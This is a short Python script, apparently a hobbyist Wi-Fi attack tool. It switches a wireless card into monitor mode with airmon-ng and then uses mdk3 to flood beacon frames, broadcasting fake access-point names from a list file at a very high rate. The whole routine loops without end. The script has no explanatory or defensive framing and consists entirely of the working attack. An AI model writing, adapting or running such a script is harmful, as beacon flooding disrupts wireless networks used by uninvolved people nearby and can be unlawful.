import os
import sys
import time

class Core(object):
    def __init__(self):
        self.interface = input("wlan0 or wlan1 >> ")
        self.monitor_mode()

    def __str__(self):
        pass

    def monitor_mode(self):
        if self.interface:
            print("Make sure!")
            print(os.system("iwconfig | grep 'Nickname'"))
            self.check = input("y/n >> ")
            if self.check != "y":
                self.interface = input("[CHANGE] wlan0 or wlan1 >> ")
                os.system(f"sudo airmon-ng start {self.interface}")
                time.sleep(1.5)
                os.system(f"sudo mdk3 {self.interface} b -c 1 -f nets.lst -g -t -m -a -s 9999999")
            else:
                os.system(f"sudo airmon-ng start {self.interface}")
                time.sleep(1.5)
                os.system(f"sudo mdk3 {self.interface} b -c 1 -f nets.lst -g -t -m -a -s 9999999")
        else:
            print("Error! Try again.")


while True:
    run = Core()